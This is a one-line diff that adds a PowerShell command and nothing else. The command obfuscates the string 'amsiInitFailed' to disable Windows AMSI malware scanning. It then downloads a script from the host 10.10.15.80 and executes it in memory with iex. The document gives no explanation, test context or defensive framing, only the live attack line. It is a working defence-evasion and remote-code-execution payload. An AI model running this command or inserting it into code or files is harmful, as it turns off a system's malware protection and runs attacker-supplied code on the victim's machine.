@@ -1,0 +1,1 @@
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false);(new-object system.net.webclient).downloadstring('http://10.10.15.80/sa1.ps1') | iex;
